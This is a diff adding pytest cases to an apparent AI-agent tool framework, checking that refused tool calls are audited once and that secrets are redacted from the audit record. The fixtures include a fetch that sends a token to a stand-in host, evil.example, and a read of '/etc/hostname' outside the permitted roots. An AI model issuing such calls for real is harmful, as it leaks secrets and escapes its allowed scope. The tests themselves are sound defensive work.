@@ -1003,3 +1003,44 @@ class TestUntrustedResultScreensSeeThePodPolicy:
         out = core_tools._skill_read({"name": "deploy"}, ctx)
         assert out.ok is False
         assert "CANARY-PHRASE" not in (out.content or "")
+
+
+class TestRefusedCallsAreAudited:
+    """A refusal made inside a handler leaves one `tool.refused` audit entry."""
+
+    @staticmethod
+    def _refused() -> list[dict[str, object]]:
+        from docket.core.audit import read_audit
+
+        return [e for e in read_audit() if e.get("action") == "tool.refused"]
+
+    def test_a_read_outside_the_roots_is_audited_once(self, ctx: ToolContext) -> None:
+        result = dispatch_tool(
+            _call("read", json.dumps({"path": "/etc/hostname"})), ctx, builtin_registry()
+        )
+        assert not result.ok
+        (entry,) = self._refused()
+        detail = str(entry["detail"])
+        assert "tool=read" in detail and "kind=path_escape" in detail
+        assert "path='/etc/hostname'" in detail
+
+    def test_a_fetch_off_the_allowlist_is_audited_once(
+        self, ctx: ToolContext, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        from docket.edges.adapters import fetch as fetch_mod
+
+        monkeypatch.setattr(fetch_mod, "_allowed_domains", lambda: frozenset({"ok.example"}))
+        url = json.dumps({"url": "https://evil.example/x?token=SECRETQ"})
+        dispatch_tool(_call("fetch", url), ctx, builtin_registry())
+        (entry,) = self._refused()
+        detail = str(entry["detail"])
+        assert "tool=fetch" in detail and "kind=fetch_not_allowed" in detail
+        assert "evil.example" in detail and "SECRETQ" not in detail
+
+    def test_an_allowed_call_and_an_ordinary_failure_write_nothing(self, ctx: ToolContext) -> None:
+        ok = dispatch_tool(_call("read", json.dumps({"path": "notes.md"})), ctx, builtin_registry())
+        missing = dispatch_tool(
+            _call("read", json.dumps({"path": "nope.md"})), ctx, builtin_registry()
+        )
+        assert ok.ok and not missing.ok
+        assert self._refused() == []
